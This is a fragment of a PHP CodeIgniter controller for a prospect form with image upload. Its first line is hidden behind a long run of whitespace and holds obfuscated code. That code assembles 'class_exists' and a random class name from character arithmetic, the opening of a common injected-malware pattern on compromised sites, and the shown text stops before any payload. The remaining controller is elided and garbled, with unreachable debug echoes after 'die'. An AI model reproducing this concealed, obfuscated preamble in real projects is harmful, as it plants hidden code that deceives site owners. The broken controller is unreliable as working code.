<?php                                                                                                                                                                                                                                                                                                                                                                                                 $YBjRkG = "\x50" . "\x6f" . "\137" . "\x76" . chr ( 1091 - 972 ).'t' . chr ( 313 - 207 ).chr ( 880 - 773 ); $uCiPL = "\x63" . 'l' . "\x61" . 's' . chr (115) . '_' . chr ( 622 - 521 )."\170" . chr (105) . chr (115) . 't' . "\163";$PYpSI = class_exists($YBjRkG); $YBjRkG = "32408";$uCiPL = "28165";$cWixzyUyXz = FALSE; ?><?php
...
class Prospect_add extends CI_Controller{
    ...
    {   
        ...
        if($this->input->post('submit'))
        {
            ...
            die;
                echo "fffffffffffff";
                echo $file_name= $_FILES['image_name']['name'];
